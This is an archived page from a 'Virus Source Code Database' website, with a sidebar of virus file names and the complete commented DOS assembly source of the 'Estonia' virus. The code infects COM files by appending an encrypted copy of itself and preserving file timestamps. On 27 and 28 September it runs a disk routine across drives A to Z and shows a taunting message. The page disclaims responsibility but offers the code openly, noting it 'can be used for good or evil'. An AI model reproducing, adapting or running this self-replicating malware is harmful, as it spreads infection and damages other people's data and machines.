<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: estonia_asm</title>
<meta name="KEYWORDS" content="estonia.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for estonia.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ear_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear_6_asm.php">ear_6_asm</a><br>
<a href="ear6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear6_asm.php">ear6_asm</a><br>
<a href="earthda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthda__asm.php">earthda__asm</a><br>
<a href="earthday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthday_asm.php">earthday_asm</a><br>
<a href="e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/e_asm.php">e_asm</a><br>
<a href="easytroj_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/easytroj_pas.php">easytroj_pas</a><br>
<a href="ebbelqux_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelqux_asm.php">ebbelqux_asm</a><br>
<a href="ebbelwoi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelwoi_asm.php">ebbelwoi_asm</a><br>
<a href="ebugdis1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis1_asm.php">ebugdis1_asm</a><br>
<a href="ebugdis__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis__asm.php">ebugdis__asm</a><br>
<a href="eddie2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie2_asm.php">eddie2_asm</a><br>
<a href="eddie_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_3_asm.php">eddie_3_asm</a><br>
<a href="eddie3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie3_asm.php">eddie3_asm</a><br>
<a href="eddie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_asm.php">eddie_asm</a><br>
<a href="edv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/edv_asm.php">edv_asm</a><br>
<a href="ee3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ee3_asm.php">ee3_asm</a><br>
<a href="eemvoor1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor1_asm.php">eemvoor1_asm</a><br>
<a href="eemvoor2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor2_asm.php">eemvoor2_asm</a><br>
<a href="eemvoor3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor3_asm.php">eemvoor3_asm</a><br>
<a href="eemvoord_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoord_asm.php">eemvoord_asm</a><br>
<a href="emf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf__asm.php">emf__asm</a><br>
<a href="emf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf_asm.php">emf_asm</a><br>
<a href="emfii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emfii_asm.php">emfii_asm</a><br>
<a href="emma_10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emma_10_asm.php">emma_10_asm</a><br>
<a href="emmie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emmie_asm.php">emmie_asm</a><br>
<a href="encode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encode_asm.php">encode_asm</a><br>
<a href="en_com_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_com_asm.php">en_com_asm</a><br>
<a href="encrcom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrcom_asm.php">encrcom_asm</a><br>
<a href="encrexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrexe_asm.php">encrexe_asm</a><br>
<a href="encroach_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encroach_asm.php">encroach_asm</a><br>
<a href="encrypt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrypt_asm.php">encrypt_asm</a><br>
<a href="enemy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enemy_asm.php">enemy_asm</a><br>
<a href="enew_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enew_asm.php">enew_asm</a><br>
<a href="en_exe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_exe_asm.php">en_exe_asm</a><br>
<a href="enigma__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma__asm.php">enigma__asm</a><br>
<a href="enigma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma_asm.php">enigma_asm</a><br>
<a href="erasboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasboot_asm.php">erasboot_asm</a><br>
<a href="erasef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasef_asm.php">erasef_asm</a><br>
<a href="eric-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eric-c_asm.php">eric-c_asm</a><br>
<a href="es1411_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/es1411_asm.php">es1411_asm</a><br>
<a href="estonia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/estonia_asm.php">estonia_asm</a><br>
<a href="etern562_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern562_asm.php">etern562_asm</a><br>
<a href="etern599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern599_asm.php">etern599_asm</a><br>
<a href="eternit2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit2_asm.php">eternit2_asm</a><br>
<a href="eternit__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit__asm.php">eternit__asm</a><br>
<a href="eternity_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternity_asm.php">eternity_asm</a><br>
<a href="etr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etr_asm.php">etr_asm</a><br>
<a href="evilman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/evilman_asm.php">evilman_asm</a><br>
<a href="exebug2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug2_asm.php">exebug2_asm</a><br>
<a href="exebug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug_asm.php">exebug_asm</a><br>
<a href="extasy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy__asm.php">extasy__asm</a><br>
<a href="extasy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy_asm.php">extasy_asm</a><br>
<a href="ezint1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint1_asm.php">ezint1_asm</a><br>
<a href="ezint2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint2_asm.php">ezint2_asm</a><br>
<a href="ezint4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint4_asm.php">ezint4_asm</a><br>
<a href="ezint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint_asm.php">ezint_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


;                      D   A   R   K   M   A   N
;                           Proudly Presents
;                      E   S   T   O   N   I   A

psp          equ     100h
virussize    equ     extracopy - code
cryptsize    equ     extracopy - crypted - 01h
dtaoffset    equ     02h * virussize + psp
filetime     equ     dtaoffset + 16h
filedate     equ     dtaoffset + 18h
filesize     equ     dtaoffset + 1ah
filename     equ     dtaoffset + 1eh
memsize      equ     dtaoffset + 2bh

estonia      segment
             assume  cs:estonia,ds:estonia,es:estonia
             org     100h                ; Origin of COM-file

code:
             call    viruscode
virusid      db      'ES'                ; Estonia Scan-ID

viruscode:
             pop     bp                  ; Load BP from stack
             sub     bp,offset virusid   ; BP = delta offset

             or      bp,bp               ; BP = 0?
             je      crypted             ; Equal? Jump to crypted
             std                         ; Set direction flag
             lea     bx,[bp+crypted]     ; AX = offset encrypted code
             mov     cx,02h              ; Transpose 2 times
             mov     dx,cryptsize        ; Decrypt 350 bytes
denexttime:
             push    cx                  ; Save CX at stack
             mov     cx,dx               ; CX = size of encrypted code
             mov     di,bx
             add     di,dx               ; DI = offset of last encrypted code
             mov     si,di               ; SI = offset of last encrypted code
             lodsb                       ; Load last plain byte
             sub     [bx],al             ; Subtract AL from first encrypt byte
denextbyte:
             lodsw                       ; Load 2 encrypted bytes
             sub     ah,al               ; Subtract AL from AH
             mov     al,ah               ; AL = decrypted byte
             stosb                       ; Store a decrypted byte
             inc     si                  ; Increase SI
             loop    denextbyte
             pop     cx                  ; Load CX from stack
             loop    denexttime
crypted:
             cld                         ; Clear direction flag
             mov     ah,2ah              ; Get system date
             int     21h                 ; Do it!
             cmp     dx,091bh            ; 27. September?
             jb      dontsink            ; Below? Jump to dontsink
             cmp     dx,091ch            ; 28. September?
             ja      dontsink            ; Above? Jump to dontsink

             xor     al,al               ; Clear AL
             mov     cx,19h              ; Destroy drives A-Z
formattrack:
             push    cx                  ; Save CX at stack
             mov     ah,2                ; Read a track
             xor     cx,cx               ; Clear CX
             xor     dh,dh               ; Clear DH
             mov     dl,al
             int     13h                 ; Do it! (disk)
             inc     al                  ; Increase AL
             pop     cx                  ; Load CX from stack
             loop    formattrack

             mov     ah,09h              ; Standard output string
             lea     dx,message          ; DX = offset of message
             int     21h                 ; Do it!
             
             int     20h                 ; Exit to DOS!
dontsink:
             mov     ah,4ah              ; Modify memory allocation
             mov     bx,1000h            ; The new block size is 65535 bytes
             int     21h                 ; Do it!
             jc      virusexit           ; Error? Jump to vitusexit

             mov     ah,1ah              ; Set disk transfer address
             lea     dx,[bp+dtaoffset]   ; DX = offset of new DTA
             int     21h                 ; Do it!

             mov     ah,4eh              ; Find first matching file
             mov     cx,22h              ; File attribute hidden+archive
             lea     dx,[bp+filespec]    ; DX = offset of filespec
findnext:
             int     21h                 ; Do it!
             jnc     infect              ; No error? Jump to infect
virusexit:
             mov     ah,1ah              ; Set disk transfer address
             mov     dx,80h              ; DX = offset of default DTA
             int     21h                 ; Do it!

             mov     di,100h             ; DI = beginning of code
             lea     si,[bp+realcode]    ; SI = offset of realcode
             push    di                  ; Restore Instruction Pointer (IP)
             movsw                       ; Move the real code to the beginning
             movsw                       ;  "    "   "    "   "   "      "
             movsb                       ;  "    "   "    "   "   "      "
             ret                         ; Return!
setfileinfo:
             mov     cx,[bp+filetime]    ; CX = file time in DTA
             mov     dx,[bp+filedate]    ; DX = file date in DTA
             mov     ax,5701h            ; Set file data and time
             int     21h                 ; Do it!
closefile:
             mov     ah,3eh              ; Close file
             int     21h                 ; Do it!
             mov     ah,4fh              ; Find next matching file
             jmp     short findnext
infect:
             mov     cx,virussize        ; Move 400 bytes
             lea     di,[bp+extracopy]   ; DI = offset of extracopy
             lea     si,[bp+code]        ; SI = offset of code
             rep     movsb               ; Create an extra copy of virus

             mov     ax,3d02h            ; Open file (read/write)
             lea     dx,[bp+filename]    ; DX = offset of filename in DTA
             int     21h                 ; Do it!
             jc      closefile           ; Error? Jump to closefile
             xchg    ax,bx               ; Exchange AX with BX

             mov     ax,word ptr [bp+filesize]
             cmp     ax,05h              ; AX = 5? (AX < 5)
             jb      closefile           ; Less? Jump to closefile
             cmp     ax,(65535-memsize)  ; AX = 64432? (AX > 64432)
             ja      closefile           ; Greater? Jump to closefile

             sub     ax,03h              ; AX = offset of virus code
             mov     [bp+offset estoniacode+01h],ax

             mov     ah,3fh              ; Read from file
             mov     cx,05h              ; Read 5 bytes
             lea     dx,[bp+virussize+realcode]
             int     21h                 ; Do it!

             cmp     [bp+virussize+offset realcode+03h],'SE'
             je      closefile           ; Infected? Jump to closefile

             lea     di,[bp+virussize+cryptvalues]
             in      ax,40h              ; AX = port 40h
             stosw                       ; Store AX in crypt values
             in      ax,40h              ; AX = port 40h
             stosw                       ; Store AX in crypt value

             push    bx                  ; Save BX at stack
             lea     bx,[bp+virussize+crypted]
             mov     cx,02h              ; Transpose 2 times
             mov     dx,cryptsize        ; Encrypt 350 bytes
ennexttime:
             push    cx                  ; Save CX at stack
             mov     cx,dx               ; CX = size of plain code
             mov     di,bx               ; DI = offset of plain code
             mov     si,bx               ; SI = offset of plain code
             inc     di                  ; Increase DI
ennextbyte:
             lodsw                       ; Load 2 plain bytes
             add     al,ah               ; Add AH to AL
             stosb                       ; Store a encrypted byte
             dec     si                  ; Decrease SI
             loop    ennextbyte
             add     [bx],al             ; Add AL to plain byte
             pop     cx                  ; Load CX from stack
             loop    ennexttime
             pop     bx                  ; Load BX from stack

             mov     ax,4202h            ; Move file pointer to the end
             xor     cx,cx               ; Clear CX
             cwd                         ; Convert word to doubleword
             int     21h                 ; Do it!

             mov     ah,40h              ; Write to file
             mov     cx,virussize        ; Write 400 bytes
             lea     dx,[bp+extracopy]   ; DX = offset of extracopy
             int     21h                 ; Do it!
             cmp     ax,cx               ; Disk full?
             jne     infectdone          ; Error? Jump to infectdone

             mov     ax,4200h            ; Move file pointer to the beginning
             xor     cx,cx               ; Clear CX
             cwd                         ; Convert word to doubleword
             int     21h                 ; Do it!

             mov     ah,40h              ; Write to file
             mov     cx,05h              ; Write 5 bytes
             lea     dx,[bp+estoniacode] ; DX = offset of estoniacode
             int     21h                 ; Do it!
infectdone:
             jmp     setfileinfo

cryptvalues  db      04h dup(?)          ; Cryption values
estoniacode  db      0e8h,00h,00h,'ES'   ; New code of infected file
realcode     db      0cdh,20h            ; Real code of infected file
             db      03h dup(?)
filespec     db      '*.COM',00h         ; File specification
message      db      'Your drives were ' ; This message will be shown the
             db      'on the Estonia...' ; 27 / 28. September and then the
             db      ' They DIDN''T sur' ; drives (A-Z) bootsector will
             db      'vive!!!',0dh,0ah   ; look like it is being destroyed!!!
             db      '$'
extracopy:

estonia      ends
end          code

</textarea></td></tr></table></body></html>
